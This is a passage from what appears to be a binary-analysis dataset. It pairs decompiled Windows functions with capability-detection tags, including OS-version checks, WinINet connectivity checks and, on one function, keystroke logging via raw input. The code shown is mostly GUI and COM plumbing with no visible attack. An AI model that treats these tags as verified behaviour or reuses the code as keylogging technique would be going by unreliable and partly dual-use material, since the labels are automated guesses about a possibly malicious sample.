        "decompiled_code": "\nvoid __fastcall fcn.0043ce7e(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = *(param_1 + 0x28);\n    *(param_1 + 0x24) = 0;\n    if (piVar1 != NULL) {\n        if (piVar1[8] != 0) {\n            piVar1 = (**(*piVar1 + 0xf0))();\n            iVar2 = (*_sym.imp.USER32.dll_IsWindow)(*(*(param_1 + 0x28) + 0x20));\n            if ((iVar2 != 0) && (*piVar1 != 0)) {\n                fcn.0041ee46();\n            }\n            fcn.0041e6f8();\n        }\n        *(*(param_1 + 0x28) + 0x50) = 0;\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "0043cecc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0043cecc(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if ((*(param_1 + 0x28) != 0) &&\n       (iVar1 = (**(**(param_1 + 0x28) + 0xc))(*(param_1 + 0x2c), 0xfffffffe, param_2, 0),  iVar1 != 0)) {\n        return 1;\n    }\n    iVar1 = *(param_1 + 0x20);\n    if ((iVar1 == 0) || (*(iVar1 + 0x20) == 0)) {\n        iVar1 = fcn.0041901a();\n    }\n    uVar2 = (**(**(iVar1 + 0x20) + 0xc))(*(param_1 + 0x2c), 0xfffffffe, param_2, 0);\n    return uVar2;\n}\n",
        "token_count": 220
    },
    "0043d8f6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0043d8f6(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0xc) == 0) {\n        return 0;\n    }\n    (**(**(param_1 + 0xc) + 0xb4))();\n    (**(**(*(param_1 + 0xc) + 0x90) + 4))(param_1, 1);\n    // WARNING: Could not recover jumptable at 0x0043d92b. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar1 = (****(*(param_1 + 0xc) + 0x90))();\n    return uVar1;\n}\n",
        "token_count": 164
    },
    "004401b6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004401b6(int32_t *arg_8h)\n\n{\n    code **ppcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    \n    puVar2 = arg_8h;\n    if (arg_8h == NULL) {\n        return -0x7fffbffb;\n    }\n    ppcVar1 = *arg_8h;\n    arg_8h = NULL;\n    iVar3 = (**ppcVar1)(puVar2, 0x48f6c4, &arg_8h);\n    if (iVar3 < 0) {\ncode_r0x004401f7:\n        if (arg_8h != NULL) {\n            (**(*arg_8h + 8))(arg_8h);\n        }\n    }\n    else {\n        if (*in_ECX == 0) {\n            iVar3 = fcn.0043c542(1);\n            if (iVar3 < 0) goto code_r0x004401f7;\n            *(*in_ECX + 4) = 1;\n        }\n        iVar3 = fcn.0043c5a3(in_ECX[3], in_ECX[4], *in_ECX, in_ECX[6], arg_8h);\n        if (arg_8h != NULL) {\n            (**(*arg_8h + 8))(arg_8h);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 327
    },
    "00440a60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00440a60(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t arg_ch;\n    int32_t iVar4;\n    uint32_t var_4h;\n    \n    iVar4 = 0;\n    var_4h = 0;\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            if ((*(in_ECX + 0x10) == 0) || (*(*(in_ECX + 0x10) + var_4h) != '\\x01')) {\n                iVar2 = *(iVar4 + 0x14 + *(in_ECX + 0x14));\n                if ((iVar2 == 0xd) || (iVar2 == 9)) {\n                    iVar3 = *(in_ECX + 0x14) + iVar4;\n                    if (*((*(iVar3 + 0x10) + 3 + *(iVar3 + 4) & 0xfffffffcU) + 4 + *(in_ECX + 8)) != 0)\n                    goto code_r0x00440b2d;\n                    iVar3 = *(in_ECX + 0x14) + iVar4;\n                    arg_ch = *(iVar3 + 4) + *(in_ECX + 8);\n                }\n                else {\n                    iVar3 = *(in_ECX + 0x14) + iVar4;\n                    arg_ch = *(iVar3 + 4) + *(in_ECX + 8);\n                }\n                fcn.004409b2(*(iVar3 + 0x14), arg_ch, arg_8h);\n            }\n            else {\n                iVar3 = *(in_ECX + 0x14) + iVar4;\n                if (((*((*(iVar3 + 0x10) + 3 + *(iVar3 + 4) & 0xfffffffcU) + 4 + *(in_ECX + 8)) != 3) &&\n                    (piVar1 = *(iVar4 + 4 + *(in_ECX + 0x14)) + *(in_ECX + 8),  piVar1 != NULL)) && (*piVar1 != 0)) {\n                    (*_sym.imp.ole32.dll_CoTaskMemFree)(*piVar1);\n                    *piVar1 = 0;\n                }\n            }\ncode_r0x00440b2d:\n            var_4h = var_4h + 1;\n            iVar4 = iVar4 + 0x30;\n        } while (var_4h < *(in_ECX + 0xc));\n    }\n    return;\n}\n",
        "token_count": 587
    },
    "00440eb5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_35h\n\nvoid __cdecl fcn.00440eb5(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    code **ppcVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int32_t *piVar9;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint32_t arg_24h;\n    uint *puVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_35h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint var_4h;\n    \n    fcn.00458ee4(0x68);\n    *(unaff_EBP + -0x24) = *0x48f848;\n    *(unaff_EBP + -0x20) = *0x48f84c;\n    *(unaff_EBP + -0x1c) = *0x48f850;\n    *(unaff_EBP + -0x50) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x4c) = extraout_ECX;\n    *(unaff_EBP + -0x18) = *0x48f854;\n    *(unaff_EBP + -0x35) = 0;\n    if (*(unaff_EBP + 8) == 0) goto code_r0x004414e3;\n    *(unaff_EBP + -0x34) = 0;\n    puVar10 = *(unaff_EBP + -0x50);\n    ppcVar4 = *puVar10;\n    *(unaff_EBP + -4) = 0;\n    iVar6 = (**ppcVar4)(puVar10, 0x48f6c4, unaff_EBP + -0x34);\n    *(unaff_EBP + -0x28) = iVar6;\n    if (iVar6 < 0) {\n        piVar9 = *(unaff_EBP + -0x34);\n        *(unaff_EBP + -4) = 0xffffffff;\ncode_r0x00440f1c:\n        if (piVar9 != NULL) {\n            (**(*piVar9 + 8))(piVar9);\n        }\n        goto code_r0x004414e3;\n    }\n    *(unaff_EBP + -0x2c) = 0;\n    if (extraout_ECX[5] == 0) {\n        *(unaff_EBP + -0x28) = 0;\n        ppcVar4 = *puVar10;\n        *(unaff_EBP + -4) = 1;\n        iVar6 = (**ppcVar4)(puVar10, 0x48f6a4, unaff_EBP + -0x28);\n        piVar9 = *(unaff_EBP + -0x28);\n        if (iVar6 < 0) {\n            *(unaff_EBP + -4) = 0;\n            if (piVar9 != NULL) {\n                (**(*piVar9 + 8))(piVar9);\n            }\n            piVar9 = *(unaff_EBP + -0x34);\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (piVar9 != NULL) {\n                (**(*piVar9 + 8))(piVar9);\n            }\n            goto code_r0x004414e3;\n        }\n        iVar6 = (**(*piVar9 + 0xc))(piVar9, extraout_ECX + 3, extraout_ECX + 5, extraout_ECX + 6);\n        piVar9 = *(unaff_EBP + -0x28);\n        *(unaff_EBP + -4) = 0;\n        if (-1 < iVar6) {\n            *(extraout_ECX + 7) = 0;\n            if (piVar9 != NULL) {\n                (**(*piVar9 + 8))(piVar9);\n            }\n            goto code_r0x00440fc8;\n        }\n        if (piVar9 != NULL) {\n            (**(*piVar9 + 8))(piVar9);\n        }\n        piVar9 = *(unaff_EBP + -0x34);\n        *(unaff_EBP + -4) = 0xffffffff;\ncode_r0x004414d9:\n        if (piVar9 != NULL) {\n            (**(*piVar9 + 8))(piVar9);\n        }\n        goto code_r0x004414e3;\n    }\n    *(extraout_ECX + 7) = 1;\ncode_r0x00440fc8:\n    uVar11 = extraout_ECX[3];\n    *(unaff_EBP + -0x40) = 0;\n    *(unaff_EBP + -4) = 2;\n    uVar7 = fcn.004170b4(-(uVar11 * 0x34 >> 0x20 != 0) | uVar11 * 0x34);\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x40) = uVar7;\n    if (*(unaff_EBP + -0x40) == 0) {\ncode_r0x00441009:\n        piVar9 = *(unaff_EBP + -0x34);\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    else {\n        *(unaff_EBP + -0x48) = *(unaff_EBP + -0x40);\n        iVar6 = extraout_ECX[3];\n        *(unaff_EBP + -4) = 5;\n        iVar6 = fcn.004170b4(iVar6);\n        extraout_ECX[4] = iVar6;\n        *(unaff_EBP + -4) = 4;\n        uVar11 = 0;\n        if (extraout_ECX[4] != 0) {\n            *(unaff_EBP + -0x30) = *(unaff_EBP + -0x40);\n            *(unaff_EBP + -0x44) = 0;\n            while (uVar11 < extraout_ECX[3]) {\n                *(uVar11 + extraout_ECX[4]) = 0;\n                iVar12 = uVar11 * 0x30;\n                iVar6 = extraout_ECX[5] + iVar12;\n                if ((*(iVar6 + 0x10) < extraout_ECX[9] || *(iVar6 + 0x10) == extraout_ECX[9]) ||\n                   (*(iVar6 + 0x14) == 0xd)) {\n                    if (*(iVar6 + 0x14) == 0xd) {\n                        *(unaff_EBP + -0x3c) = 0;\n                        *(unaff_EBP + -4) = 9;\n                        uVar7 = fcn.004170b4(0x14);\n                        *(unaff_EBP + -0x3c) = uVar7;\n                        *(unaff_EBP + -4) = 4;\n                        if (*(unaff_EBP + -0x3c) == 0) {\n                            iVar6 = *(unaff_EBP + -0x44);\n                            if (iVar6 != 0) {\n                                puVar10 = *(unaff_EBP + -0x40) + 0x14;\n                                do {\n                                    fcn.004170df(*puVar10);\n                                    puVar10 = puVar10 + 0xd;\n                                    iVar6 = iVar6 + -1;\n                                } while (iVar6 != 0);\n                            }\n                            goto code_r0x00441230;\n                        }\n                        puVar10 = 0x48f828;\ncode_r0x00441252:\n                        puVar5 = *(unaff_EBP + -0x3c);\n                        *puVar5 = 0;\n                        puVar5[1] = *puVar10;\n                        puVar5[2] = puVar10[1];\n                        puVar5[3] = puVar10[2];\n                        puVar5[4] = puVar10[3];\n                        iVar12 = *(unaff_EBP + -0x44) * 0x30;\n                        *(extraout_ECX[5] + 0x14 + iVar12) = 0xd;\n                        *(extraout_ECX[5] + 0x10 + iVar12) = 4;\n                        iVar6 = extraout_ECX[5];\n                        *(unaff_EBP + -0x28) = iVar6 + iVar12;\n                        iVar8 = fcn.0043c6d5(*(iVar6 + iVar12 + 0x14));\n                        uVar7 = *(unaff_EBP + -0x3c);\n                        iVar6 = *(unaff_EBP + -0x28);\n                        arg_24h = iVar8 + -1 + *(unaff_EBP + -0x2c) & ~(iVar8 - 1U);\n                        uVar11 = *(iVar6 + 0x10) + 3 + arg_24h & 0xfffffffc;\n                        iVar8 = uVar11 + 4;\n                        uVar1 = *(iVar6 + 0x17);\n                        uVar2 = *(iVar6 + 0x16);\n                        var_24h = *(iVar6 + 0x10);\n                        uVar3 = *(iVar6 + 0x14);\n                        var_2ch = *(iVar6 + 8);\n                        *(unaff_EBP + -0x28) = iVar8;\n                    }\n                    else {\n                        if (*(iVar6 + 0x14) == 0x81) {\n                            *(iVar6 + 0x10) = *(iVar6 + 0x10) + 1;\n                        }\n                        iVar6 = extraout_ECX[5] + iVar12;\n                        if (*(iVar6 + 0x14) == 0x82) {\n                            *(iVar6 + 0x10) = *(iVar6 + 0x10) * 2 + 2;\n                        }\n                        iVar6 = extraout_ECX[5];\n                        *(unaff_EBP + -0x28) = iVar6 + iVar12;\n                        iVar6 = fcn.0043c6d5(*(iVar6 + iVar12 + 0x14));\n                        arg_24h = iVar6 + -1 + *(unaff_EBP + -0x2c) & ~(iVar6 - 1U);\n                        iVar6 = *(unaff_EBP + -0x28);\n                        uVar11 = *(iVar6 + 0x10) + 3 + arg_24h & 0xfffffffc;\n                        uVar7 = 0;\n                        iVar8 = uVar11 + 4;\n                        uVar1 = *(iVar6 + 0x17);\n                        uVar2 = *(iVar6 + 0x16);\n                        var_24h = *(iVar6 + 0x10);\n                        uVar3 = *(iVar6 + 0x14);\n                        var_2ch = *(iVar6 + 8);\n                        *(unaff_EBP + -0x28) = iVar8;\n                    }\n                    var_28h = uVar3;\n                    *(unaff_EBP + -0x2c) = iVar8;\n                    *(unaff_EBP + -0x2c) = *(unaff_EBP + -0x2c) + 4;\n                    fcn.0043df15(*(unaff_EBP + -0x30), var_2ch, var_28h, var_24h, uVar2, uVar1, 0, arg_24h, uVar11, \n                                 iVar8, uVar7);\n                }\n                else if (extraout_ECX[8] == 2) {\n                    uVar11 = *(unaff_EBP + -0x2c) + 3U & 0xfffffffc;\n                    *(unaff_EBP + -0x28) = uVar11 + 4;\n                    *(unaff_EBP + -0x2c) = uVar11 + 8;\n                    uVar7 = *(unaff_EBP + -0x28);\n                    *(iVar6 + 0x10) = 0;\n                    iVar6 = extraout_ECX[5] + iVar12;\n                    arg_24h = 0;\n                    fcn.0043e040(*(unaff_EBP + -0x30), *(iVar6 + 8), *(iVar6 + 0x14), *(iVar6 + 0x10), *(iVar6 + 0x16), \n                                 *(iVar6 + 0x17), 0, 0, uVar11, uVar7, 0, 0, 1);\n                }\n                else {\n                    if (extraout_ECX[8] != 1) {\n                        if (*(unaff_EBP + -0x35) == '\\0') {\n                            *(unaff_EBP + -0x60) = 0x89;\n                            *(unaff_EBP + -0x5c) = 0x8b;\n                            *(unaff_EBP + -0x58) = 0;\n                            *(unaff_EBP + -0x54) = 0;\n                            fcn.00440dc6(*(unaff_EBP + -0x50), unaff_EBP + -0x60, unaff_EBP + -0x58, 2);\n                            if (*(unaff_EBP + -0x58) == 0) {\n                                if (*(unaff_EBP + -0x54) != 0) {\n                                    puVar10 = 0x48f838;\n                                    goto code_r0x004411d7;\n                                }\n                            }\n                            else {\n                                puVar10 = 0x48f848;\ncode_r0x004411d7:\n                                *(unaff_EBP + -0x24) = *puVar10;\n                                *(unaff_EBP + -0x20) = puVar10[1];\n                                *(unaff_EBP + -0x1c) = puVar10[2];\n                                *(unaff_EBP + -0x18) = puVar10[3];\n                            }\n                            *(unaff_EBP + -0x35) = 1;\n                        }\n                        *(unaff_EBP + -0x3c) = 0;\n                        *(unaff_EBP + -4) = 7;\n                        uVar7 = fcn.004170b4(0x14);\n                        *(unaff_EBP + -0x3c) = uVar7;\n                        *(unaff_EBP + -4) = 4;\n                        if (*(unaff_EBP + -0x3c) != 0) {\n                            puVar10 = unaff_EBP + -0x24;\n                            goto code_r0x00441252;\n                        }\n                        iVar6 = *(unaff_EBP + -0x44);\n                        if (iVar6 != 0) {\n                            puVar10 = *(unaff_EBP + -0x40) + 0x14;\n                            do {\n                                fcn.004170df(*puVar10);\n                                puVar10 = puVar10 + 0xd;\n                                iVar6 = iVar6 + -1;\n                            } while (iVar6 != 0);\n                        }\n                        goto code_r0x00441230;\n                    }\n                    *(iVar6 + 0x14) = *(iVar6 + 0x14) | 0x4000;\n                    iVar6 = *(unaff_EBP + -0x44);\n                    *(extraout_ECX[5] + 0x10 + iVar12) = 4;\n                    *(iVar6 + extraout_ECX[4]) = 1;\n                    iVar6 = extraout_ECX[5];\n                    *(unaff_EBP + -0x28) = iVar6 + iVar12;\n                    iVar6 = fcn.0043c6d5(*(iVar6 + iVar12 + 0x14));\n                    arg_24h = iVar6 + -1 + *(unaff_EBP + -0x2c) & ~(iVar6 - 1U);\n                    iVar6 = *(unaff_EBP + -0x28);\n                    uVar11 = *(iVar6 + 0x10) + 3 + arg_24h & 0xfffffffc;\n                    *(unaff_EBP + -0x28) = uVar11 + 4;\n                    *(unaff_EBP + -0x2c) = uVar11 + 8;\n                    fcn.0043e040(*(unaff_EBP + -0x30), *(iVar6 + 8), *(iVar6 + 0x14), *(iVar6 + 0x10), *(iVar6 + 0x16), \n                                 *(iVar6 + 0x17), 0, arg_24h, uVar11, *(unaff_EBP + -0x28), 0, 0, 0);\n                }\n                *(unaff_EBP + -0x30) = *(unaff_EBP + -0x30) + 0x34;\n                iVar6 = extraout_ECX[5];\n                *(unaff_EBP + -0x44) = *(unaff_EBP + -0x44) + 1;\n                *(iVar6 + 4 + iVar12) = arg_24h;\n                uVar11 = *(unaff_EBP + -0x44);\n            }\n            if (*extraout_ECX == 0) {\n                iVar6 = fcn.0043c542(1);\n                *(unaff_EBP + -0x28) = iVar6;\n                if (iVar6 < 0) {\n                    uVar11 = 0;\n                    if (extraout_ECX[3] != 0) {\n                        puVar10 = *(unaff_EBP + -0x40) + 0x14;\n                        do {\n                            fcn.004170df(*puVar10);\n                            uVar11 = uVar11 + 1;\n                            puVar10 = puVar10 + 0xd;\n                        } while (uVar11 < extraout_ECX[3]);\n                    }\n                    fcn.004170df(extraout_ECX[4]);\n                    uVar7 = *(unaff_EBP + -0x48);\n                    extraout_ECX[4] = 0;\n                    *(unaff_EBP + -4) = 0;\n                    fcn.004170df(uVar7);\n                    piVar9 = *(unaff_EBP + -0x34);\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    goto code_r0x00440f1c;\n                }\n                *(*extraout_ECX + 4) = 1;\n            }\n            uVar7 = *(unaff_EBP + -0x2c);\n            extraout_ECX[2] = 0;\n            *(unaff_EBP + -4) = 0xb;\n            iVar6 = fcn.004170b4(uVar7);\n            extraout_ECX[2] = iVar6;\n            *(unaff_EBP + -4) = 4;\n            uVar11 = 0;\n            if (extraout_ECX[2] != 0) {\n                fcn.00459330(extraout_ECX[2], 0, *(unaff_EBP + -0x2c));\n                iVar6 = fcn.0043c5a3(*(unaff_EBP + -0x40), extraout_ECX[3], *extraout_ECX, *(unaff_EBP + -0x2c), \n                                     *(unaff_EBP + -0x34));\n                if (iVar6 < 0) {\n                    fcn.004170df(extraout_ECX[4]);\n                    extraout_ECX[4] = 0;\n                }\n                *(unaff_EBP + -4) = 0;\n                fcn.004170df(*(unaff_EBP + -0x48));\n                piVar9 = *(unaff_EBP + -0x34);\n                *(unaff_EBP + -4) = 0xffffffff;\n                goto code_r0x004414d9;\n            }\n            if (extraout_ECX[3] != 0) {\n                puVar10 = *(unaff_EBP + -0x40) + 0x14;\n                do {\n                    fcn.004170df(*puVar10);\n                    uVar11 = uVar11 + 1;\n                    puVar10 = puVar10 + 0xd;\n                } while (uVar11 < extraout_ECX[3]);\n            }\ncode_r0x00441230:\n            fcn.004170df(extraout_ECX[4]);\n            uVar7 = *(unaff_EBP + -0x48);\n            extraout_ECX[4] = 0;\n            *(unaff_EBP + -4) = 0;\n            fcn.004170df(uVar7);\n            goto code_r0x00441009;\n        }\n        *(unaff_EBP + -4) = 0;\n        fcn.004170df(*(unaff_EBP + -0x40));\n        piVar9 = *(unaff_EBP + -0x34);\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    if (piVar9 != NULL) {\n        (**(*piVar9 + 8))(piVar9);\n    }\ncode_r0x004414e3:\n    fcn.00458f40();\n    return;\n}\n",
        "token_count": 4911
    },
    "00441f65": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00441f65(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    \n    if (param_1[4] != NULL) {\n        if (*param_1 != NULL) {\n            fcn.00440dab(*param_1);\n        }\n        piVar1 = param_1[4];\n        if (piVar1 != NULL) {\n            fcn.0043c62e();\n            fcn.004170df(piVar1);\n        }\n        param_1[4] = NULL;\n    }\n    if (*param_1 != NULL) {\n        fcn.0043da6e();\n        piVar1 = *param_1;\n        if (piVar1 != NULL) {\n            *param_1 = NULL;\n            (**(*piVar1 + 8))(piVar1);\n        }\n        piVar1 = param_1[1];\n        if (piVar1 != NULL) {\n            param_1[1] = NULL;\n            (**(*piVar1 + 8))(piVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 241
    },
    "004434a1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004434a1(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.00443111(arg_10h);\n    if (iVar1 == 0) {\n        return;\n    }\n    if (arg_10h != 0) {\n        uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(*(arg_10h + 0x20), 0xffffffec);\n        if ((uVar2 & 0x10000) != 0) {\n            return;\n        }\n        var_4h = fcn.004430be(arg_10h);\n    }\n    if (arg_ch == arg_10h) {\n        if ((var_4h & 0x20) == 0) {\n            return;\n        }\n        if (arg_ch == 0) goto code_r0x00443573;\n        iVar1 = arg_8h;\n        uVar3 = fcn.00443474(arg_8h);\n        iVar4 = fcn.0044336e(arg_8h, uVar3);\n        if (((iVar4 == 0) || (iVar4 == arg_10h)) || (uVar2 = fcn.004430be(iVar4),  (uVar2 & 0x10) == 0))\n        goto code_r0x00443573;\ncode_r0x0044353f:\n        fcn.00443412(arg_8h, iVar1);\n    }\n    else {\n        iVar1 = arg_10h;\n        if (((arg_ch != 0) && (iVar4 = fcn.004430be(arg_ch),  iVar4 != 0)) || ((arg_10h != 0 && (var_4h != 0))))\n        goto code_r0x0044353f;\n    }\n    if ((var_4h & 0x30) == 0) {\n        uVar3 = fcn.00443474(arg_8h);\n        arg_10h = fcn.0044336e(arg_8h, uVar3);\n        uVar2 = fcn.004430be(arg_10h);\n        if ((uVar2 & 0x20) == 0) {\n            return;\n        }\n        iVar1 = fcn.0042271e();\n        if (iVar1 == 0) {\n            return;\n        }\n    }\ncode_r0x00443573:\n    fcn.004433c5(arg_10h);\n    return;\n}\n",
        "token_count": 604
    },
    "00443581": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00443581(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    \n    piVar2 = fcn.0041c92d();\n    if (piVar2 != NULL) {\n        iVar1 = piVar2[0x11];\n        while (iVar1 != 0) {\n            ppiVar3 = fcn.0041c771();\n            piVar2 = *ppiVar3;\n            if ((piVar2[1] != 0) && (*(piVar2[1] + 0x24) == *(arg_ch + 0x20))) {\n                return piVar2;\n            }\n            if (*piVar2 == *(arg_ch + 0x20)) {\n                return piVar2;\n            }\n        }\n        piVar2 = NULL;\n    }\n    return piVar2;\n}\n",
        "token_count": 211
    },
    "004435d3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.004435d3(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t **ppiVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    \n    iVar4 = arg_8h;\n    if (arg_8h != 0) goto code_r0x004435e5;\ncode_r0x004435e0:\n    fcn.0041901a();\ncode_r0x004435e5:\n    piVar7 = arg_ch;\n    arg_8h = 0;\n    piVar3 = piVar7;\n    if (arg_ch != NULL) {\n        if (arg_ch[1] == 0) {\n            iVar2 = *arg_ch;\n        }\n        else {\n            iVar2 = *(arg_ch[1] + 0x24);\n        }\n        if (iVar2 != 0) {\n            uVar1 = fcn.0041e67e(iVar2);\n            iVar2 = fcn.00443157(iVar4, uVar1);\n            if (iVar2 != 0) {\n                piVar3 = fcn.00443581(iVar4, iVar2);\n            }\n        }\n    }\n    while (((piVar3 = fcn.004231d5(piVar3),  piVar3 != NULL && (arg_8h = arg_8h + 1,  piVar3 != piVar7)) &&\n           (arg_8h < 0x3d))) {\n        iVar4 = fcn.0044301e(piVar3, arg_10h);\n        if (iVar4 != 0) {\n            return piVar3;\n        }\n    }\n    iVar4 = fcn.0041c92d();\n    if (iVar4 != 0) {\n        arg_8h = *(iVar4 + 0x44);\n        if (piVar7 == NULL) {\n            ppiVar5 = fcn.0041c771(&arg_8h);\n            piVar3 = *ppiVar5;\n            piVar7 = piVar3;\n        }\n        else {\n            piVar3 = NULL;\n            if (arg_8h == 0) {\n                return NULL;\n            }\n            do {\n                if (piVar3 == piVar7) break;\n                ppiVar5 = fcn.0041c771();\n                piVar3 = *ppiVar5;\n            } while (arg_8h != 0);\n        }\n        if (((arg_8h != 0) && (piVar3 != NULL)) && (piVar7 != NULL)) {\n            do {\n                if (arg_8h == 0) {\n                    arg_8h = *(iVar4 + 0x44);\n                }\n                ppiVar5 = fcn.0041c771(&arg_8h);\n                piVar3 = *ppiVar5;\n                iVar2 = fcn.0044301e(piVar3, arg_10h);\n                if (iVar2 != 0) {\n                    if (piVar3 == NULL) {\ncode_r0x004436fa:\n                        if (piVar3[1] == 0) goto code_r0x004435e0;\n                        uVar6 = (**(*piVar3[1] + 0x78))();\n                        uVar6 = uVar6 & 0x8000000;\n                    }\n                    else {\n                        if (piVar3[1] == 0) {\n                            iVar2 = *piVar3;\n                        }\n                        else {\n                            iVar2 = *(piVar3[1] + 0x24);\n                        }\n                        if (iVar2 == 0) goto code_r0x004436fa;\n                        uVar6 = (*_sym.imp.USER32.dll_IsWindowEnabled)(iVar2);\n                    }\n                    if (uVar6 != 0) {\n                        return piVar3;\n                    }\n                }\n                if (piVar3 == piVar7) {\n                    return NULL;\n                }\n            } while( true );\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 921
    },
    "00443724": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00443724(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t **ppiVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    piVar2 = fcn.00443581(arg_8h, arg_ch);\n    piVar6 = piVar2;\n    if ((piVar2 == NULL) && (iVar3 = fcn.0041c92d(),  iVar3 != 0)) {\n        iVar7 = *(iVar3 + 0x44);\n        while (piVar6 = piVar2,  iVar7 != 0) {\n            ppiVar4 = fcn.0041c771();\n            piVar6 = *ppiVar4;\n            if (((piVar6[1] != 0) && (piVar6[1] == *(iVar3 + 0x70))) ||\n               ((*piVar6 != 0 && (iVar5 = (*_sym.imp.USER32.dll_GetFocus)(),  *piVar6 == iVar5)))) break;\n        }\n    }\n    iVar3 = 0;\n    do {\n        piVar6 = fcn.004435d3(arg_8h, piVar6, arg_10h);\n        if (piVar6 == NULL) {\n            return NULL;\n        }\n        iVar7 = fcn.0044306e(piVar6);\n        if ((iVar7 != 0) && (piVar6 = 